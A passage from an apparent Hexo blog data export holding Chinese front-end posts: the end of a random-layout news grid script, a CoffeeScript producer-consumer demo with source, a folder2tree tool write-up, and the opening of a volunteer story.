r, this)\n\t\t})\n\t} )();\n\t\n\t/*切割函数*/\n\tfunction _cutGrid(tag, funcJudge) {\n\t\tfunction a(a) {\n\t\t\tfunction h(cutLength) {\n\t\t\t\t/*复制子块对象并计算出子块top,left*/\n\t\t\t\tvar u, a = _shadowClone(cutLength);\n\t\t\t\tc++,\n\t\t\t\tu = c === l ? tag[cutType2.measure] - s: Math.floor(cutLength[cutType2.measure] * tag[cutType2.measure] / 100),\n\t\t\t\ta[cutType1.offset] = i + tag[cutType1.offset],\n\t\t\t\ta[cutType2.offset] = s + tag[cutType2.offset],\n\t\t\t\ta[cutType1.measure] = f,\n\t\t\t\ta[cutType2.measure] = u,\n\t\t\t\ta.colorPattern = tag.colorPattern,\n\t\t\t\t/*判断小块是否还需要分割*/\n\t\t\t\tfuncJudge(a),\n\t\t\t\ts += u\n\t\t\t}\n\t\t\tvar f, l = a[cutType2.name].length,\n\t\t\tc = 0;\n\t\t\tu++,\n\t\t\tf = u === cutLength ? tag[cutType1.measure] - i: Math.floor(a[cutType1.measure] * tag[cutType1.measure] / 100),\n\t\t\ta.random === !1 ? a[cutType2.name].forEach(h) : a[cutType2.name].randomEach(h),\n\t\t\ts = 0,\n\t\t\ti += f\n\t\t}\n\t\t/*根据大块是否有rows属性，定义两种切割方式*/\n\t\tvar cutType1, cutType2;\n\t\ttag.rows ? (cutType1 = {\n\t\t\tname: \"rows\",\n\t\t\tmeasure: \"height\",\n\t\t\toffset: \"top\"\n\t\t},\n\t\tcutType2 = {\n\t\t\tname: \"cols\",\n\t\t\tmeasure: \"width\",\n\t\t\toffset: \"left\"\n\t\t}) : (cutType1 = {\n\t\t\tname: \"cols\",\n\t\t\tmeasure: \"width\",\n\t\t\toffset: \"left\"\n\t\t},\n\t\tcutType2 = {\n\t\t\tname: \"rows\",\n\t\t\tmeasure: \"height\",\n\t\t\toffset: \"top\"\n\t\t});\n\t\tvar i = 0,\n\t\ts = 0,\n\t\tcutLength = tag[cutType1.name].length,\n\t\tu = 0;\n\t\t/*是否随机布局*/\n\t\ttag.random === !1 ? tag[cutType1.name].forEach(a) : tag[cutType1.name].randomEach(a)\n\t}\n```\n##**四.最后**\n完成到这一步，我已不记得声明对象时出了多少次错误。各种尖括号，方括号，逗号和分号翩翩起舞时，你一定跟我一样很想念coffee的语法糖…","slug":"my-news-reader-box","updated":1409150639000,"excerpt":"<p><img src=\"/assets/blogImg/myReader0.jpg\" alt=\"聚合阅读\">   </p>\n<p>网易<a href=\"http://news.tag.163.com/\" target=\"_blank\" rel=\"external\">聚合阅读</a>的出现的确让人惊艳了一下。流畅的交互,使碎片化的新闻资讯像报纸一样摊在眼前,这是信息大爆炸的时代产物。不管你能不能接受这种新阅读形式，事实上，每天越来越多的新闻层出不穷，还没被人看到就已成为了“旧闻”。回归报纸的版面设计，堆叠新闻模块，让用户告别一条接一条整齐的新闻链接，而是在一个版面上提供更多的信息，不失为一种尝试。</p>\n<p>而抛去产品的层面，从前端方向来看，“聚合阅读”也有许多值得学习的地方。这几天研究了一下源码，谈谈它随机布局的实现，以及一些优化的措施。</p>\n<h2 id=\"demo\"><strong>demo</strong></h2>\n<p>点击按钮可以改变布局：<br>","_id":"epbg09m0e0ztnk2a","categories":[],"photos":[],"link":""},{"layout":"post","title":"生产者-消费者模型的coffeescript实现","date":1356364260000,"comments":true,"tags":["w6w1sbbrofyval78","do9xtt4v8s887wdy"],"content":"<p>这两天一直在看coffeescript相关的东西，也帮一个朋友搞了个生产者-消费者模型的C语言实现。想到还没用coffeescript真正意义上写过程序，那就尝试做一下吧。</p>\n<p>其实<a href=\"http://read.douban.com/ebook/198648/\" target=\"_blank\" rel=\"external\">《CoffeeScript小书》</a>是暑假实习时就买了，一直比较向往着函数式编程却拖延了很久没行动起来。小书只有几十页，本是github上一个开源的项目，我喜欢这种轻巧的文字。语法部分看下来，再看下类与继承，只花了半天的时间，而且心情非常愉悦，然后就可以开始我菜鸟的第一次试飞了。</p>\n<p>生产者-消费者模型没什么好说的了，就是读写共享缓冲区，pv操作控制是否冲突。更多的就是冲着coffeescript来的。下面是一些凌乱但自认为有思考价值的记录，或许后续我会继续写一些coffeescript的学习笔记，再做深入的研究。<br><a id=\"more\"></a></p>\n<h2 id=\"demo，可尝试点击“生产”“消费”按钮\"><strong>demo，可尝试点击“生产”“消费”按钮</strong></h2>\n<p><iframe src=\"/assets/demo/coffee_pc_demo/pro-con.html\" width=\"780\" height=\"336\" scrolling=\"no\"></iframe></p>\n<h2 id=\"litten如是想：\"><strong>litten如是想：</strong></h2>\n<ul>\n<li>我一定要学一门，至少一门函数式风格编程语言，没有太深远的想法，就觉得它就是我的菜       </li>\n<li>这个程序是66行的coffeescript代码，最后编译后得到了122行的js代码，说明编程效率提升显著          </li>\n<li>括号，方括号，花括号，还有逗号有时候会多烦人，特别是使用过ExtJs的人，而coffeescript可以没有</li>\n<li>用法简洁的jquery在coffeescript里面会更简洁                   </li>\n<li>关于coffeescript的循环，它不推荐你使用for循环，而是使用“推导”，暴露在底层的循环只有while语法        </li>\n<li>事件绑定时，使用=&gt;可以免去js上下文切换this的麻烦               </li>\n<li>coffeescript的数组迭代方法非常的酷，三言两语说不清             </li>\n<li>javascript会是下一个JVM吗？              </li>\n<li>站在产品的角度，我认为coffeescript这名字太长了-_-!              </li>\n</ul>\n<h2 id=\"附上源码\"><strong>附上源码</strong></h2>\n<figure class=\"highlight coffeescript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div></pre></td><td class=\"code\"><pre><div class=\"line\">N = <span class=\"number\">10</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ProCon</span></span></div><div class=\"line\">　　<span class=\"attribute\">data</span>: </div><div class=\"line\">　　　　<span class=\"attribute\">mutex</span>:<span class=\"number\">1</span></div><div class=\"line\">　　　　<span class=\"attribute\">empty</span>:N</div><div class=\"line\">　　　　<span class=\"attribute\">full</span>:<span class=\"number\">0</span></div><div class=\"line\">　　　　<span class=\"attribute\">front</span>:<span class=\"number\">0</span></div><div class=\"line\">　　　　<span class=\"attribute\">rear</span>:<span class=\"number\">0</span></div><div class=\"line\">　　　　<span class=\"attribute\">buf</span>: []</div><div class=\"line\">　　<span class=\"attribute\">init</span>:<span class=\"function\">-&gt;</span></div><div class=\"line\">　　　　i = <span class=\"number\">0</span></div><div class=\"line\">　　　　<span class=\"keyword\">while</span> i&lt;N</div><div class=\"line\">　　　　　　newDom = $(<span class=\"string\">'&lt;div class=\"bufBox\"&gt;&lt;div class=\"bufCover\"&gt;'</span>+i+<span class=\"string\">'&lt;/div&gt;'</span>+i+<span class=\"string\">'&lt;/div&gt;'</span>)</div><div class=\"line\">　　　　　　$(<span class=\"string\">'#buf'</span>).append(newDom)</div><div class=\"line\">　　　　　　<span class=\"property\">@data</span>.buf.push <span class=\"string\">'e'</span></div><div class=\"line\">　　　　　　i++</div><div class=\"line\">　　　　$(<span class=\"string\">'#produce'</span>).click<span class=\"function\"> =&gt;</span></div><div class=\"line\">　　　　　　<span class=\"property\">@producer</span>()</div><div class=\"line\">　　　　$(<span class=\"string\">'#consume'</span>).click<span class=\"function\"> =&gt;</span></div><div class=\"line\">　　　　　　<span class=\"property\">@consumer</span>()</div><div class=\"line\">　　<span class=\"attribute\">p</span>:<span class=\"function\"><span class=\"params\">(num)</span>-&gt;</span></div><div class=\"line\">　　　　<span class=\"keyword\">return</span> --num</div><div class=\"line\">　　<span class=\"attribute\">v</span>:<span class=\"function\"><span class=\"params\">(num)</span>-&gt;</span></div><div class=\"line\">　　　　<span class=\"keyword\">return</span> ++num</div><div class=\"line\">　　<span class=\"attribute\">produceItem</span>:<span class=\"function\">-&gt;</span></div><div class=\"line\">　　　　$(<span class=\"string\">'&lt;p class=\"desPro\"&gt;生产了产品&lt;/p&gt;'</span>).insertBefore $(<span class=\"string\">\"#des p:first\"</span>)</div><div class=\"line\">　　　　<span class=\"keyword\">return</span> <span class=\"string\">'m'</span></div><div class=\"line\">　　<span class=\"attribute\">consumeItem</span>:<span class=\"function\">-&gt;</span></div><div class=\"line\">　　　　$(<span class=\"string\">'&lt;p class=\"desCon\"&gt;消费了产品&lt;/p&gt;'</span>).insertBefore $(<span class=\"string\">\"#des p:first\"</span>)</div><div class=\"line\">　　<span class=\"attribute\">enterItem</span>:<span class=\"function\"><span class=\"params\">(item)</span> -&gt;</span></div><div class=\"line\">　　　　<span class=\"property\">@data</span>.front = (<span class=\"property\">@data</span>.front+<span class=\"number\">1</span>)%N</div><div class=\"line\">　　　　<span class=\"property\">@data</span>.buf[<span class=\"property\">@data</span>.front] = item;</div><div class=\"line\">　　　　str = <span class=\"string\">\"存入产品<span class=\"subst\">#{<span class=\"property\">@data</span>.buf[<span class=\"property\">@data</span>.front]}</span>到缓冲区<span class=\"subst\">#{<span class=\"property\">@data</span>.front}</span>\"</span></div><div class=\"line\">　　　　$(<span class=\"string\">\"&lt;p class='desPro'&gt;<span class=\"subst\">#{str}</span>&lt;/p&gt;\"</span>).insertBefore $(<span class=\"string\">\"#des p:first\"</span>)</div><div class=\"line\">　　　　$($(<span class=\"string\">'.bufCover'</span>)[<span class=\"property\">@data</span>.front]).animate </div><div class=\"line\">　　　　　　<span class=\"string\">\"height\"</span>:<span class=\"string\">\"50px\"</span></div><div class=\"line\">　　<span class=\"attribute\">removeItem</span>:<span class=\"function\">-&gt;</span></div><div class=\"line\">　　　　<span class=\"property\">@data</span>.rear = (<span class=\"property\">@data</span>.rear + <span class=\"number\">1</span>) % N;</div><div class=\"line\">　　　　<span class=\"property\">@data</span>.buf[<span class=\"property\">@data</span>.rear] = <span class=\"string\">'e'</span>;</div><div class=\"line\">　　　　str = <span class=\"string\">\"取出产品<span class=\"subst\">#{<span class=\"property\">@data</span>.buf[<span class=\"property\">@data</span>.rear]}</span>从缓冲区<span class=\"subst\">#{<span class=\"property\">@data</span>.rear}</span>\"</span></div><div class=\"line\">　　　　$(<span class=\"string\">\"&lt;p class='desCon'&gt;<span class=\"subst\">#{str}</span>&lt;/p&gt;\"</span>).insertBefore $(<span class=\"string\">\"#des p:first\"</span>)</div><div class=\"line\">　　　　$($(<span class=\"string\">'.bufCover'</span>)[<span class=\"property\">@data</span>.rear]).animate </div><div class=\"line\">　　　　　　<span class=\"string\">\"height\"</span>:<span class=\"string\">\"0px\"</span></div><div class=\"line\">　　<span class=\"attribute\">producer</span>:<span class=\"function\">-&gt;</span></div><div class=\"line\">　　　　<span class=\"keyword\">if</span> <span class=\"property\">@data</span>.full==N</div><div class=\"line\">　　　　　　$(<span class=\"string\">\"&lt;p class='desSpe'&gt;缓冲区已全满&lt;/p&gt;\"</span>).insertBefore $(<span class=\"string\">\"#des p:first\"</span>)</div><div class=\"line\">　　　　　　<span class=\"keyword\">return</span></div><div class=\"line\">　　　　item = <span class=\"property\">@produceItem</span>()</div><div class=\"line\">　　　　<span class=\"property\">@data</span>.empty = <span class=\"property\">@p</span>(<span class=\"property\">@data</span>.empty)</div><div class=\"line\">　　　　<span class=\"property\">@data</span>.mutex = <span class=\"property\">@p</span>(<span class=\"property\">@data</span>.mutex)</div><div class=\"line\">　　　　<span class=\"property\">@enterItem</span>(item)</div><div class=\"line\">　　　　<span class=\"property\">@data</span>.mutex = <span class=\"property\">@v</span>(<span class=\"property\">@data</span>.mutex)</div><div class=\"line\">　　　　<span class=\"property\">@data</span>.full = <span class=\"property\">@v</span>(<span class=\"property\">@data</span>.full)</div><div class=\"line\">　　<span class=\"attribute\">consumer</span>:<span class=\"function\">-&gt;</span></div><div class=\"line\">　　　　<span class=\"keyword\">if</span> <span class=\"property\">@data</span>.empty==N</div><div class=\"line\">　　　　　　$(<span class=\"string\">\"&lt;p class='desSpe'&gt;缓冲区已空&lt;/p&gt;\"</span>).insertBefore $(<span class=\"string\">\"#des p:first\"</span>)</div><div class=\"line\">　　　　　　<span class=\"keyword\">return</span></div><div class=\"line\">　　　　<span class=\"property\">@data</span>.full = <span class=\"property\">@p</span>(<span class=\"property\">@data</span>.full)</div><div class=\"line\">　　　　<span class=\"property\">@data</span>.mutex = <span class=\"property\">@p</span>(<span class=\"property\">@data</span>.mutex)</div><div class=\"line\">　　　　<span class=\"property\">@removeItem</span>()</div><div class=\"line\">　　　　<span class=\"property\">@data</span>.mutex = <span class=\"property\">@v</span>(<span class=\"property\">@data</span>.mutex)</div><div class=\"line\">　　　　<span class=\"property\">@data</span>.empty = <span class=\"property\">@v</span>(<span class=\"property\">@data</span>.empty)</div><div class=\"line\">　　　　<span class=\"property\">@consumeItem</span>()</div><div class=\"line\">　　　　</div><div class=\"line\">procon = <span class=\"keyword\">new</span> ProCon</div><div class=\"line\">procon.init();</div></pre></td></tr></table></figure>\n\n","source":"_posts/coffee-pc.markdown","raw":"---\nlayout: post\ntitle: \"生产者-消费者模型的coffeescript实现\"\ndate: 2012-12-24 23:51\ncomments: true\ntags: \n\t- js \n\t- coffeescript \n---\n这两天一直在看coffeescript相关的东西，也帮一个朋友搞了个生产者-消费者模型的C语言实现。想到还没用coffeescript真正意义上写过程序，那就尝试做一下吧。\n\n其实[《CoffeeScript小书》](http://read.douban.com/ebook/198648/)是暑假实习时就买了，一直比较向往着函数式编程却拖延了很久没行动起来。小书只有几十页，本是github上一个开源的项目，我喜欢这种轻巧的文字。语法部分看下来，再看下类与继承，只花了半天的时间，而且心情非常愉悦，然后就可以开始我菜鸟的第一次试飞了。\n\n生产者-消费者模型没什么好说的了，就是读写共享缓冲区，pv操作控制是否冲突。更多的就是冲着coffeescript来的。下面是一些凌乱但自认为有思考价值的记录，或许后续我会继续写一些coffeescript的学习笔记，再做深入的研究。\n<!-- more -->\n##**demo，可尝试点击“生产”“消费”按钮**\n<iframe src=\"/assets/demo/coffee_pc_demo/pro-con.html\" width=\"780\" height=\"336\" scrolling=\"no\"></iframe>\n##**litten如是想：**\n+ 我一定要学一门，至少一门函数式风格编程语言，没有太深远的想法，就觉得它就是我的菜       \n+ 这个程序是66行的coffeescript代码，最后编译后得到了122行的js代码，说明编程效率提升显著          \n+ 括号，方括号，花括号，还有逗号有时候会多烦人，特别是使用过ExtJs的人，而coffeescript可以没有\n+ 用法简洁的jquery在coffeescript里面会更简洁                   \n+ 关于coffeescript的循环，它不推荐你使用for循环，而是使用“推导”，暴露在底层的循环只有while语法        \n+ 事件绑定时，使用=>可以免去js上下文切换this的麻烦               \n+ coffeescript的数组迭代方法非常的酷，三言两语说不清             \n+ javascript会是下一个JVM吗？              \n+ 站在产品的角度，我认为coffeescript这名字太长了-_-!              \n\n##**附上源码**\n```coffeescript\n\tN = 10\n\n\tclass ProCon\n\t\tdata: \n\t\t\tmutex:1\n\t\t\tempty:N\n\t\t\tfull:0\n\t\t\tfront:0\n\t\t\trear:0\n\t\t\tbuf: []\n\t\tinit:->\n\t\t\ti = 0\n\t\t\twhile i<N\n\t\t\t\tnewDom = $('<div class=\"bufBox\"><div class=\"bufCover\">'+i+'</div>'+i+'</div>')\n\t\t\t\t$('#buf').append(newDom)\n\t\t\t\t@data.buf.push 'e'\n\t\t\t\ti++\n\t\t\t$('#produce').click =>\n\t\t\t\t@producer()\n\t\t\t$('#consume').click =>\n\t\t\t\t@consumer()\n\t\tp:(num)->\n\t\t\treturn --num\n\t\tv:(num)->\n\t\t\treturn ++num\n\t\tproduceItem:->\n\t\t\t$('<p class=\"desPro\">生产了产品</p>').insertBefore $(\"#des p:first\")\n\t\t\treturn 'm'\n\t\tconsumeItem:->\n\t\t\t$('<p class=\"desCon\">消费了产品</p>').insertBefore $(\"#des p:first\")\n\t\tenterItem:(item) ->\n\t\t\t@data.front = (@data.front+1)%N\n\t\t\t@data.buf[@data.front] = item;\n\t\t\tstr = \"存入产品#{@data.buf[@data.front]}到缓冲区#{@data.front}\"\n\t\t\t$(\"<p class='desPro'>#{str}</p>\").insertBefore $(\"#des p:first\")\n\t\t\t$($('.bufCover')[@data.front]).animate \n\t\t\t\t\"height\":\"50px\"\n\t\tremoveItem:->\n\t\t\t@data.rear = (@data.rear + 1) % N;\n\t\t\t@data.buf[@data.rear] = 'e';\n\t\t\tstr = \"取出产品#{@data.buf[@data.rear]}从缓冲区#{@data.rear}\"\n\t\t\t$(\"<p class='desCon'>#{str}</p>\").insertBefore $(\"#des p:first\")\n\t\t\t$($('.bufCover')[@data.rear]).animate \n\t\t\t\t\"height\":\"0px\"\n\t\tproducer:->\n\t\t\tif @data.full==N\n\t\t\t\t$(\"<p class='desSpe'>缓冲区已全满</p>\").insertBefore $(\"#des p:first\")\n\t\t\t\treturn\n\t\t\titem = @produceItem()\n\t\t\t@data.empty = @p(@data.empty)\n\t\t\t@data.mutex = @p(@data.mutex)\n\t\t\t@enterItem(item)\n\t\t\t@data.mutex = @v(@data.mutex)\n\t\t\t@data.full = @v(@data.full)\n\t\tconsumer:->\n\t\t\tif @data.empty==N\n\t\t\t\t$(\"<p class='desSpe'>缓冲区已空</p>\").insertBefore $(\"#des p:first\")\n\t\t\t\treturn\n\t\t\t@data.full = @p(@data.full)\n\t\t\t@data.mutex = @p(@data.mutex)\n\t\t\t@removeItem()\n\t\t\t@data.mutex = @v(@data.mutex)\n\t\t\t@data.empty = @v(@data.empty)\n\t\t\t@consumeItem()\n\t\t\t\n\tprocon = new ProCon\n\tprocon.init();\n```\n\n\n\n","slug":"coffee-pc","updated":1409150181000,"excerpt":"<p>这两天一直在看coffeescript相关的东西，也帮一个朋友搞了个生产者-消费者模型的C语言实现。想到还没用coffeescript真正意义上写过程序，那就尝试做一下吧。</p>\n<p>其实<a href=\"http://read.douban.com/ebook/198648/\" target=\"_blank\" rel=\"external\">《CoffeeScript小书》</a>是暑假实习时就买了，一直比较向往着函数式编程却拖延了很久没行动起来。小书只有几十页，本是github上一个开源的项目，我喜欢这种轻巧的文字。语法部分看下来，再看下类与继承，只花了半天的时间，而且心情非常愉悦，然后就可以开始我菜鸟的第一次试飞了。</p>\n<p>生产者-消费者模型没什么好说的了，就是读写共享缓冲区，pv操作控制是否冲突。更多的就是冲着coffeescript来的。下面是一些凌乱但自认为有思考价值的记录，或许后续我会继续写一些coffeescript的学习笔记，再做深入的研究。<br>","_id":"zepd4al3srncokzb","categories":[],"photos":[],"link":""},{"layout":"post","title":"一个文件夹的自我介绍","date":1406249520000,"comments":true,"tags":["yefz2ekux4b65n2m","w6w1sbbrofyval78","0554rycmagrgjpnt"],"content":"<h1 id=\"folder2tree\">folder2tree</h1>\n<blockquote>\n<p>用字符展示文件夹结构</p>\n</blockquote>\n<h3 id=\"前言_Before:\">前言 Before:</h3>\n<p>如何介绍一个文件夹，简直纠结。 </p>\n<p>要么<strong>图片</strong>，如果在截图前，你真的愿意，一层一层一层的剥开我的心。你会鼻酸你会流泪；<br>要么<strong>靠说</strong>，那么你可能得这么说：从前，有一个文件夹，文件夹里有两张图片；大图片在跟小图片讲故事…讲个什么故事额          </p>\n<p><strong>因而，用纯字符描述文件夹的小工具必须得有呀。</strong><a href=\"https://github.com/litten/folder2tree\" target=\"_blank\" rel=\"external\">github here</a>.<br><a id=\"more\"></a></p>\n<h3 id=\"使用_Usage:\">使用 Usage:</h3>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div></pre></td><td class=\"code\"><pre><div class=\"line\">@param {Dom} 父级dom节点               </div><div class=\"line\">@param {<span class=\"built_in\">Array</span>} 描述文件夹层级关系对象</div><div class=\"line\"></div><div class=\"line\">folder2tree.init(<span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"ctn\"</span>), [</div><div class=\"line\">　　{</div><div class=\"line\">　　　　<span class=\"string\">\"img\"</span> : [</div><div class=\"line\">　　　　　　<span class=\"string\">\"sprite.png\"</span>,</div><div class=\"line\">　　　　　　<span class=\"string\">\"bg.png\"</span></div><div class=\"line\">　　　　]</div><div class=\"line\">　　},{</div><div class=\"line\">　　　　<span class=\"string\">\"js\"</span>: [{</div><div class=\"line\">　　　　　　<span class=\"string\">\"common\"</span>: [</div><div class=\"line\">　　　　　　　　<span class=\"string\">\"jquery.js\"</span>,{</div><div class=\"line\">　　　　　　　　　　<span class=\"string\">\"highcharts\"</span>: [{</div><div class=\"line\">　　　　　　　　　　　　<span class=\"string\">\"modules\"</span>: [<span class=\"string\">\"exporting.js\"</span>]</div><div class=\"line\">　　　　　　　　　　},</div><div class=\"line\">　　　　　　　　　　<span class=\"string\">\"highcharts.js\"</span></div><div class=\"line\">　　　　　　　　]}</div><div class=\"line\">　　　　　　]</div><div class=\"line\">　　　　},{</div><div class=\"line\">　　　　　　<span class=\"string\">\"index\"</span>: [</div><div class=\"line\">　　　　　　　　<span class=\"string\">\"mian.js\"</span>,{</div><div class=\"line\">　　　　　　　　　　<span class=\"string\">\"modules\"</span>: [<span class=\"string\">\"mod.video.js\"</span>]</div><div class=\"line\">　　　　　　　　}</div><div class=\"line\">　　　　　　]</div><div class=\"line\">　　　　}]</div><div class=\"line\">　　},{</div><div class=\"line\">　　　　<span class=\"string\">\"css\"</span>: [</div><div class=\"line\">　　　　　　<span class=\"string\">\"base.css\"</span>,</div><div class=\"line\">　　　　　　<span class=\"string\">\"index-main.css\"</span>,</div><div class=\"line\">　　　　　　<span class=\"string\">\"index-video.css\"</span></div><div class=\"line\">　　　　]</div><div class=\"line\">　　},</div><div class=\"line\">　　<span class=\"string\">\"index.html\"</span>,</div><div class=\"line\">　　<span class=\"string\">\"favicon.ico\"</span></div><div class=\"line\">]);</div></pre></td></tr></table></figure>\n\n<h3 id=\"展示_Show:\">展示 Show:</h3>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div></pre></td><td class=\"code\"><pre><div class=\"line\">├─img</div><div class=\"line\">│ ├─sprite.png</div><div class=\"line\">│ └─bg.png</div><div class=\"line\">├─js</div><div class=\"line\">│ ├─<span class=\"keyword\">common</span></div><div class=\"line\">│ │ ├─jquery.js</div><div class=\"line\">│ │ └─highcharts</div><div class=\"line\">│ │    ├─modules</div><div class=\"line\">│ │    │ └─exporting.js</div><div class=\"line\">│ │    └─highcharts.js</div><div class=\"line\">│ └─<span class=\"keyword\">index</span></div><div class=\"line\">│    ├─mian.js</div><div class=\"line\">│    └─modules</div><div class=\"line\">│       └─<span class=\"keyword\">mod</span>.video.js</div><div class=\"line\">├─css</div><div class=\"line\">│ ├─base.css</div><div class=\"line\">│ ├─<span class=\"keyword\">index</span>-main.css</div><div class=\"line\">│ └─<span class=\"keyword\">index</span>-video.css</div><div class=\"line\">├─<span class=\"keyword\">index</span>.html</div><div class=\"line\">└─favicon.ico</div></pre></td></tr></table></figure>\n\n","source":"_posts/folder-to-tree.markdown","raw":"---\nlayout: post\ntitle: \"一个文件夹的自我介绍\"\ndate: 2014-07-25 08:52\ncomments: true\ntags: \n\t- tools \n\t- js \n\t- github\n---       \n\n#folder2tree\n\n> 用字符展示文件夹结构\n\n### 前言 Before:\n如何介绍一个文件夹，简直纠结。 \n\n要么**图片**，如果在截图前，你真的愿意，一层一层一层的剥开我的心。你会鼻酸你会流泪；                 \n要么**靠说**，那么你可能得这么说：从前，有一个文件夹，文件夹里有两张图片；大图片在跟小图片讲故事…讲个什么故事额          \n\n**因而，用纯字符描述文件夹的小工具必须得有呀。**[github here](https://github.com/litten/folder2tree).\n<!-- more -->\n### 使用 Usage:\n\n```js\n@param {Dom} 父级dom节点               \n@param {Array} 描述文件夹层级关系对象\n\nfolder2tree.init(document.getElementById(\"ctn\"), [\n\t{\n\t\t\"img\" : [\n\t\t\t\"sprite.png\",\n\t\t\t\"bg.png\"\n\t\t]\n\t},{\n\t\t\"js\": [{\n\t\t\t\"common\": [\n\t\t\t\t\"jquery.js\",{\n\t\t\t\t\t\"highcharts\": [{\n\t\t\t\t\t\t\"modules\": [\"exporting.js\"]\n\t\t\t\t\t},\n\t\t\t\t\t\"highcharts.js\"\n\t\t\t\t]}\n\t\t\t]\n\t\t},{\n\t\t\t\"index\": [\n\t\t\t\t\"mian.js\",{\n\t\t\t\t\t\"modules\": [\"mod.video.js\"]\n\t\t\t\t}\n\t\t\t]\n\t\t}]\n\t},{\n\t\t\"css\": [\n\t\t\t\"base.css\",\n\t\t\t\"index-main.css\",\n\t\t\t\"index-video.css\"\n\t\t]\n\t},\n\t\"index.html\",\n\t\"favicon.ico\"\n]);\n```\n\n### 展示 Show:\n```\n├─img\n│ ├─sprite.png\n│ └─bg.png\n├─js\n│ ├─common\n│ │ ├─jquery.js\n│ │ └─highcharts\n│ │    ├─modules\n│ │    │ └─exporting.js\n│ │    └─highcharts.js\n│ └─index\n│    ├─mian.js\n│    └─modules\n│       └─mod.video.js\n├─css\n│ ├─base.css\n│ ├─index-main.css\n│ └─index-video.css\n├─index.html\n└─favicon.ico\n```\n","slug":"folder-to-tree","updated":1409364784000,"excerpt":"<h1 id=\"folder2tree\">folder2tree</h1>\n<blockquote>\n<p>用字符展示文件夹结构</p>\n</blockquote>\n<h3 id=\"前言_Before:\">前言 Before:</h3>\n<p>如何介绍一个文件夹，简直纠结。 </p>\n<p>要么<strong>图片</strong>，如果在截图前，你真的愿意，一层一层一层的剥开我的心。你会鼻酸你会流泪；<br>要么<strong>靠说</strong>，那么你可能得这么说：从前，有一个文件夹，文件夹里有两张图片；大图片在跟小图片讲故事…讲个什么故事额          </p>\n<p><strong>因而，用纯字符描述文件夹的小工具必须得有呀。</strong><a href=\"https://github.com/litten/folder2tree\" target=\"_blank\" rel=\"external\">github here</a>.<br>","_id":"7vefn9t51b2ub3oe","categories":[],"photos":[],"link":""},{"layout":"post","title":"小朋友，跟你谈谈印象派","date":1396194720000,"comments":true,"tags":["exylnxqv2j55vwu4","jc0qt8cakht35ew1"],"brief":"副标题：记一件难忘的事","content":"<p>今天去陪留守的小朋友一起画画，这是一个义工志愿者活动。</p>\n<p>经游戏分组，我负责带5位小朋友，正巧是三胞胎和双胞胎。<br>杜晓凡、杜晓平、杜德俊（水饺）三兄妹，文殊琪、文殊曼（馒头）姐妹。混淆了好几次谁是馒头，谁是水饺后，我已经记住你们的名字了。<br><img src=\"/assets/blogImg/volunteer1.jpg\" alt=\"5位小朋友\"><br><a id=\"more\"></a><br>小朋友们都不认生，晓凡一开始就问我好多问题。比如这些：        